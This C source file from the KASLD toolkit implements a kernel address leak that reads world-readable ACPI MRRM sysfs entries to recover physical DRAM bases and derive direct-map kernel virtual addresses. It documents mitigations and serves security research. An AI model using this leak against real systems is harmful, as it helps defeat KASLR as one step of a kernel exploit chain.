// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Read physical memory range base addresses from the ACPI MRRM
// (Memory Range and Region Mapping) table sysfs interface.
//
// The MRRM is an Intel ACPI extension describing physical memory topology
// for memory partitioning on tiered-memory and CXL systems. The kernel
// parses the MRRM table at boot and exposes each entry under:
//
//   /sys/firmware/acpi/memory_ranges/rangeN/base    (physical start, 0x%llx)
//   /sys/firmware/acpi/memory_ranges/rangeN/length  (region size, 0x%llx)
//
// Both attributes are created with __ATTR_RO (S_IRUGO, 0444) — no
// capability check, world-readable.
//
// The base addresses are physical DRAM ranges (addr_base from the ACPI
// MRRM table, i.e. struct acpi_mrrm_mem_range_entry.addr_base). On
// architectures with a fixed physical-to-virtual mapping, these convert
// directly to linear-map kernel virtual addresses.
//
// Leak primitive:
//   Data leaked:      physical DRAM base addresses from ACPI MRRM table
//   Kernel subsystem: drivers/acpi — /sys/firmware/acpi/memory_ranges/
//   Data structure:   struct mrrm_mem_range_entry → base (phys_addr_t)
//   Address type:     physical (DRAM)
//   Method:           parsed (sysfs text attribute)
//   Status:           unfixed (information exposure by design)
//   Access check:     none (world-readable via __ATTR_RO / S_IRUGO)
//   Source:
//   https://elixir.bootlin.com/linux/latest/source/drivers/acpi/acpi_mrrm.c
//
// Mitigations:
//   CONFIG_ACPI_MRRM=n removes the sysfs entries entirely; this option
//   is enabled only on systems with an ACPI MRRM table (Intel tiered
//   memory / CXL). On x86_64 with CONFIG_RANDOMIZE_MEMORY enabled,
//   physical addresses do not directly reveal the virtual text base.
//
// Requires:
// - CONFIG_ACPI_MRRM (selected on Intel tiered-memory / CXL systems)
// - An ACPI MRRM table present in firmware
//
// References:
// https://elixir.bootlin.com/linux/latest/source/drivers/acpi/acpi_mrrm.c
// ---
// <bcoles@gmail.com>

#include "include/kasld/api.h"
#include <dirent.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

KASLD_EXPLAIN(
    "Reads physical DRAM base addresses from the ACPI MRRM (Memory Range "
    "and Region Mapping) sysfs interface at "
    "/sys/firmware/acpi/memory_ranges/rangeN/base. The kernel parses the "
    "ACPI MRRM table (Intel tiered-memory / CXL systems) and exposes each "
    "physical memory range with world-readable (0444) __ATTR_RO attributes "
    "— no capability check, not gated by kptr_restrict. On architectures "
    "with a fixed physical-to-virtual mapping the base addresses directly "
    "yield linear-map kernel virtual addresses. Requires CONFIG_ACPI_MRRM.");

// Untested: no hardware with an ACPI MRRM table available for testing.
KASLD_META("method:parsed\n"
           "phase:inference\n"
           "addr:physical\n"
           "config:CONFIG_ACPI_MRRM\n");

int main(void) {
  const char *base = "/sys/firmware/acpi/memory_ranges";
  DIR *d;
  struct dirent *ent;
  char path[512];
  char buf[256];
  char label[128];
  int count = 0;

  fprintf(stderr,
          "[.] searching %s for MRRM physical memory range "
          "addresses ...\n",
          base);

  d = kasld_opendir(base);
  if (!d) {
    if (errno == EACCES || errno == EPERM)
      return KASLD_EXIT_NOPERM;
    /* /sys/firmware/acpi/memory_ranges absent if CONFIG_ACPI_MRRM is not
     * enabled or the platform has no MRRM table */
    return KASLD_EXIT_UNAVAILABLE;
  }

  while ((ent = readdir(d)) != NULL) {
    /* entries are named range0, range1, ... */
    if (strncmp(ent->d_name, "range", 5) != 0)
      continue;

    snprintf(path, sizeof(path), "%s/%s/base", base, ent->d_name);

    if (kasld_read_file_line(path, buf, sizeof(buf)) < 0)
      continue;

    unsigned long long addr = 0;
    if (sscanf(buf, "0x%llx", &addr) != 1)
      continue;

    if (!addr)
      continue;

    /* Each MRRM entry describes a range of addressable SYSTEM MEMORY tagged
     * for bandwidth monitoring (RDT-style region IDs) — ordinary DRAM the
     * kernel runs in, on tiered-memory / CXL platforms. It is NOT persistent
     * memory, and the image CAN occupy it, so tag it REGION_RAM (a DRAM
     * landmark), never a forbidden region: a forbidden tag here would let a
     * future range conversion carve valid RAM out of the candidate base set.
     * Emitted as an interior sample (not a range): an MRRM hi could be high
     * CXL memory, which as a REGION_RAM extent would loosen dram_top; a sample
     * only contributes the base to the phys floor. The directory name (e.g.
     * "range0") identifies which entry we leaked. */
    snprintf(label, sizeof(label), "%.32s", ent->d_name);

    fprintf(stderr, "[+] acpi_mrrm %s: phys = 0x%016llx\n", label, addr);
    kasld_result_sample(KASLD_TYPE_PHYS, REGION_RAM, (unsigned long)addr, label,
                        CONF_PARSED);
    count++;

#ifdef phys_to_directmap_virt
    unsigned long virt = phys_to_directmap_virt((unsigned long)addr);
    fprintf(stderr, "[+] acpi_mrrm %s: directmap va = 0x%016lx\n", label, virt);
    kasld_result_sample(KASLD_TYPE_VIRT, REGION_DIRECTMAP, virt, label,
                        CONF_PARSED);
#endif
  }
  closedir(d);

  if (!count) {
    fprintf(stderr,
            "[-] no non-zero MRRM memory range entries found in "
            "%s\n",
            base);
    return KASLD_EXIT_UNAVAILABLE;
  }

  return 0;
}
